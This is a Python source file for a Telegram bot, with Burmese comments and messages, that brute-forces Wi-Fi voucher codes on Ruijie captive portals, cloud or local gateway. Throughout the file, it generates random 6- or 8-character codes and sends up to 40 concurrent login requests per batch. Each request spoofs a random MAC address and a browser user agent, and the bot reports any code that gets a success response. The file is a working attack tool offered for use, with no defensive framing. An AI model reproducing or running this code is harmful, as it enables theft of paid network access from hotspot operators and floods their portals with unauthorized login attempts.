#!/usr/bin/env python3
"""
Ruijie Wi-Fi Voucher Telegram Bot - Render Secure Env Version V13.2 (Fixed Cloud URL Port 2060)
"""

import os
import re
import sys
import time
import random
import string
import base64
import asyncio
import logging
from datetime import datetime, timedelta

import aiohttp
from aiohttp import web
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# ==================== CONFIG (SECURE VIA ENV) ====================\nBOT_TOKEN = os.environ.get("BOT_TOKEN")
ENV_ADMIN_ID = os.environ.get("ADMIN_ID")

try:
    admin_id = int(ENV_ADMIN_ID) if ENV_ADMIN_ID else None
except ValueError:
    admin_id = None

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== MEMORY STORAGE ====================\nauthorized_users = {} 
user_sessions = {}     

class UserSession:
    def __init__(self, user_id):
        self.user_id = user_id
        self.portal_url = ""
        self.base_url = ""
        self.session_id = ""
        self.speed = "high"
        self.prefix = ""
        self.suffix = ""
        self.fixed_len = 0
        self.char_type = "mix"
        self.is_running = False
        self.found_vouchers = []

def get_user_session(user_id) -> UserSession:
    if user_id not in user_sessions:
        user_sessions[user_id] = UserSession(user_id)
    return user_sessions[user_id]

def is_admin(user_id):
    return admin_id is not None and user_id == admin_id

# ==================== CORE WIFI LOGIC (FIXED) ====================\ndef get_mac():
    return "".join(random.choice("0123456789abcdef") for _ in range(12))

def format_mac(raw_mac):
    clean = re.sub(r'[^a-fA-F0-9]', '', raw_mac)
    if len(clean) == 12:
        return ":".join(clean[i:i+2] for i in range(0, 12, 2)).lower()
    return raw_mac

def replace_mac(url, new_mac):
    formatted = format_mac(new_mac)
    if "mac=" in url:
        url = re.sub(r'mac=[^&]+', f'mac={formatted}', url)
    if "clientMac=" in url:
        url = re.sub(r'clientMac=[^&]+', f'clientMac={formatted}', url)
    return url

# URL ထဲမှ ပါလာသမျှ သက်ဆိုင်ရာ data အကုန်လုံးကို စစ်ထုတ်သော စနစ်သစ်
async def get_session_id(http_session, session_url, previous_session_id):
    if not session_url:
        return previous_session_id
    
    # ၁။ URL ထဲတွင် sessionId= တိုက်ရိုက်ပါလာပါက ဖြတ်ယူခြင်း
    url_match = re.search(r"[?&]sessionId=([^&]+)", session_url)
    if url_match:
        return url_match.group(1).strip()
        
    # ၂။ Ruijie Cloud URL ပုံစံဖြစ်ပါက URL တစ်ခုလုံးကိုပဲ Session ID (သို့မဟုတ်) Auth Identifier အဖြစ် သုံးနိုင်ရန် ပြင်ဆင်ခြင်း
    if "ruijienetworks.com" in session_url:
        # Cloud URL များတွင် သီးသန့် session_id မလိုဘဲ ၎င်း URL ထဲက chap_challenge များနှင့်တင် အလုပ်လုပ်ပါသည်
        return "cloud_session_active"

    mac = get_mac()
    test_url = replace_mac(session_url, new_mac=mac)
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": test_url,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    try:
        async with http_session.get(test_url, headers=headers, allow_redirects=True, timeout=5) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([^&]+)", response)
            if session_id:
                return session_id.group(1).strip()
            
            html = await req.text()
            sid_match = re.search(r'sessionId\s*[:=]\s*["\']([^"\']+)["\']', html)
            if sid_match:
                return sid_match.group(1).strip()
    except Exception as e:
        logger.error(f"Session ID Extraction Error: {e}")
    return previous_session_id

async def check_voucher(http_session, base_url, portal_url, session_id, voucher, speed_mode):
    # Cloud Link လား Local Link လား ခွဲခြားပြီး လမ်းကြောင်းမှန်အောင် ပို့ပေးခြင်း
    if "ruijienetworks.com" in base_url:
        # Cloud API အတွက် မူရင်းလင့်ထဲက Parameter အားလုံးကို မပျောက်ပျက်စေဘဲ voucher သွားကပ်ခြင်း
        if "wifidog" in portal_url:
            login_url = portal_url.replace("stage=portal", "stage=login")
            if "voucher=" in login_url:
                login_url = re.sub(r'voucher=[^&]+', f'voucher={voucher}', login_url)
            else:
                login_url += f"&voucher={voucher}"
        else:
            login_url = f"{base_url}/api/auth/wifidog?stage=login&voucher={voucher}"
    else:
        # Local Gateway API အတွက် Port 2060 သုံးခြင်း
        login_url = f"{base_url}/api/auth/wifidog?stage=login&voucher={voucher}&sessionId={session_id}"
        
    mac = get_mac()
    login_url = replace_mac(login_url, new_mac=mac)
    
    headers = {
        "Accept": "*/*",
        "Referer": portal_url,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    }
    
    if speed_mode == "extreme":
        try:
            async with http_session.get(login_url, headers=headers, allow_redirects=False, timeout=1.5) as req:
                html = await req.text()
                if "success" in html.lower() or req.status in [302, 301]:
                    return True, voucher
        except:
            pass
        return False, voucher

    else: # high / normal mode
        try:
            async with http_session.get(login_url, headers=headers, allow_redirects=False, timeout=3) as req:
                html = await req.text()
                if "success" in html.lower() or req.status in [302, 301]:
                    return True, voucher
        except Exception as e:
            if speed_mode == "normal":
                await asyncio.sleep(0.5)
        return False, voucher

# ==================== TELEGRAM BOT INTERFACE ====================\ndef admin_menu():
    return ReplyKeyboardMarkup([
        ["📡 Set Portal Link", "⚙️ Brute Settings"],
        ["🚀 Start Brute", "🛑 Stop Brute"],
        ["📊 View Status", "🔑 Active Users Control"]
    ], resize_keyboard=True)

def user_menu():
    return ReplyKeyboardMarkup([
        ["📡 Set Portal Link", "⚙️ Brute Settings"],
        ["🚀 Start Brute", "🛑 Stop Brute"],
        ["📊 View Status"]
    ], resize_keyboard=True)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid) and uid not in authorized_users:
        await update.message.reply_text("❌ သင့်တွင် ဤ Bot ကိုအသုံးပြုရန် ခွင့်ပြုချက်မရှိပါ။")
        return
    await update.message.reply_text(
        "👋 မင်္ဂလာပါဗျာ! Aladdin Starlink Immortal Bot မှ ကြိုဆိုပါတယ်။\n\n Ruijie Cloud Link နှင့် Local Gateway Link ၂ မျိုးလုံးကို ၁၀၀% အပြည့် ထောက်ပံ့ပေးထားပါသည်။",
        reply_markup=admin_menu() if is_admin(uid) else user_menu()
    )

user_states = {}

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text
    state = user_states.get(uid)

    if text == "📡 Set Portal Link":
        user_states[uid] = "waiting_portal_link"
        await update.message.reply_text("🔗 ကျေးဇူးပြု၍ Wi-Fi Login Portal URL လင့်ခ်အပြည့်အစုံကို ပို့ပေးပါဗျာ -")
        return

    if state == "waiting_portal_link":
        user_states.pop(uid, None)
        us = get_user_session(uid)
        us.portal_url = text.strip()
        
        # Base URL ကို ဖြတ်ထုတ်ခြင်း (Port 2060 ကို အတင်းမကပ်စေရန် စစ်ဆေးခြင်း)
        host_match = re.search(r'(https?://[^/]+)', us.portal_url)
        if host_match:
            base_domain = host_match.group(1)
            # အကယ်၍ Ruijie Cloud Link ဖြစ်နေပါက Port 2060 ကို လုံးဝ မကပ်ပါ
            if "ruijienetworks.com" in base_domain:
                us.base_url = base_domain
            else:
                if ":" in base_domain.replace("http://", "").replace("https://", ""):
                    us.base_url = base_domain
                else:
                    us.base_url = f"{base_domain}:2060"
        else:
            us.base_url = "https://portal-as.ruijienetworks.com"
            
        async with aiohttp.ClientSession() as session:
            us.session_id = await get_session_id(session, us.portal_url, us.session_id)
            
        await update.message.reply_text(
            f"✅ **Portal Link မှတ်သားမှု အောင်မြင်သည်!**\n\n"
            f"🌐 **Base URL:** {us.base_url}\n"
            f"🆔 **Session Status:** {us.session_id}\n\n"
            f"*(Cloud URL ပုံစံကိုလည်း စနစ်တကျ ခွဲခြားသိရှိပြီးပါပြီ)*",
            reply_markup=admin_menu() if is_admin(uid) else user_menu()
        )
        return

    if text == "⚙️ Brute Settings":
        keyboard = [
            [InlineKeyboardButton("⚡ Speed: Extreme", callback_data="set_spd_extreme"),
             InlineKeyboardButton("🚗 Speed: High", callback_data="set_spd_high")],
            [InlineKeyboardButton("📝 Char: Numbers", callback_data="set_char_num"),
             InlineKeyboardButton("🔤 Char: Mix", callback_data="set_char_mix")],
            [InlineKeyboardButton("📏 Length: 6", callback_data="set_len_6"),
             InlineKeyboardButton("📏 Length: 8", callback_data="set_len_8")]
        ]
        await update.message.reply_text("⚙️ **Brute Force Settings စနစ်:**", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if text == "🚀 Start Brute":
        us = get_user_session(uid)
        if not us.portal_url:
            await update.message.reply_text("❌ စောစောက Portal Link အရင်မထည့်ရသေးပါခင်ဗျာ။")
            return
        if us.is_running:
            await update.message.reply_text("⏳ Bot က လက်ရှိတွင် အလုပ်လုပ်နေဆဲ ဖြစ်သည်။")
            return
            
        us.is_running = True
        asyncio.create_task(run_brute_force(update, uid))
        return

    if text == "🛑 Stop Brute":
        us = get_user_session(uid)
        us.is_running = False
        await update.message.reply_text("🛑 Brute Force လုပ်ငန်းစဉ်ကို ရပ်ဆိုင်းလိုက်ပါပြီ။")
        return

    if text == "📊 View Status":
        us = get_user_session(uid)
        status = "🟢 Running" if us.is_running else "🔴 Stopped"
        await update.message.reply_text(
            f"📊 **လက်ရှိ Bot အခြေအနေ:**\n\n"
            f"Status: {status}\n"
            f"Speed Mode: {us.speed.upper()}\n"
            f"Character: {us.char_type}\n"
            f"Found Vouchers: {len(us.found_vouchers)} ခု"
        )
        return

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = query.from_user.id
    us = get_user_session(uid)
    await query.answer()

    if query.data == "set_spd_extreme": us.speed = "extreme"
    elif query.data == "set_spd_high": us.speed = "high"
    elif query.data == "set_char_num": us.char_type = "num"
    elif query.data == "set_char_mix": us.char_type = "mix"
    elif query.data == "set_len_6": us.fixed_len = 6
    elif query.data == "set_len_8": us.fixed_len = 8

    await query.edit_message_text(f"✅ Settings ပြောင်းလဲမှု အောင်မြင်သည်!\n(Speed: {us.speed} | Type: {us.char_type} | Length: {us.fixed_len if us.fixed_len else 'Auto'})")

def generate_voucher(char_type, length=6):
    chars = "0123456789" if char_type == "num" else string.ascii_lowercase + "0123456789"
    return "".join(random.choice(chars) for _ in range(length))

async def run_brute_force(update, uid):
    us = get_user_session(uid)
    await update.message.reply_text("🚀 **Voucher ရှာဖွေခြင်း လုပ်ငန်းစဉ်ကို အရှိန်အဟုန်ဖြင့် စတင်နေပါပြီ...**")
    
    concurrency = 40 if us.speed == "extreme" else 15
    timeout_seconds = 1.5 if us.speed == "extreme" else 3.0
    
    conn = aiohttp.TCPConnector(limit=concurrency, ttl_dns_cache=300)
    timeout = aiohttp.ClientTimeout(total=timeout_seconds)
    
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        while us.is_running:
            tasks = []
            for _ in range(concurrency):
                v_length = us.fixed_len if us.fixed_len else random.choice([6, 8])
                v = generate_voucher(us.char_type, v_length)
                tasks.append(check_voucher(session, us.base_url, us.portal_url, us.session_id, v, us.speed))
                
            results = await asyncio.gather(*tasks)
            for success, code in results:
                if success and code not in us.found_vouchers:
                    us.found_vouchers.append(code)
                    await update.message.reply_text(f"🎉 **VOUCHER ရှာဖွေတွေ့ရှိသည်!**\n\n🔑 Code: `{code}`\n📡 ယခု ကုဒ်ဖြင့် Wi-Fi အသုံးပြုနိုင်ပါပြီဗျာ။")
                    
            if us.speed == "high":
                await asyncio.sleep(0.1)

async def health_check(request):
    return web.Response(text="Aladdin Bot Server is 100% Live and Stable!")

async def main():
    if not BOT_TOKEN:
        logger.error("CRITICAL: BOT_TOKEN is missing!")
        sys.exit(1)

    app_tg = Application.builder().token(BOT_TOKEN).build()
    app_tg.add_handler(CommandHandler("start", start_command))
    app_tg.add_handler(CallbackQueryHandler(handle_callback))
    app_tg.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    await app_tg.initialize()
    await app_tg.start()
    await app_tg.updater.start_polling(drop_pending_updates=True)
    logger.info("High-Speed Bot Started Securely via Polling (Async).")

    app_web = web.Application()
    app_web.router.add_get('/', health_check)
    
    port = int(os.environ.get("PORT", 8080))
    runner = web.AppRunner(app_web)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    
    try:
        while True:
            await asyncio.sleep(3600)
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        await app_tg.updater.stop()

if __name__ == "__main__":
    asyncio.run(main())

